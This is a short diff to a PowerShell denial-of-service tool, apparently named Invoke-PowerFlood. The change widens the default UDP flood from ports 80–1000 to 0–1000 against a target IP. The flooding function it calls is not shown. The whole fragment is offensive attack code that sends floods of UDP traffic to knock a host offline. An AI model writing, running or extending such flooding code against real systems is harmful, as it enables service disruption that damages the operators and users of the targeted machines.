@@ -55,7 +55,7 @@ function Invoke-PowerFlood {
 }
     if ($targetIP) {
         # launch udp flood on range of ports if no port specified
-        if ($port -eq -1) {foreach ( $port in 80..1000 ) { udpEngine $targetIP $port }} else
+        if ($port -eq -1) {foreach ( $port in 0..1000 ) { udpEngine $targetIP $port }} else
         {udpEngine $targetIP $port}
  
     } else { write-host -ForegroundColor "Red" "[!] target IP not specified!" }
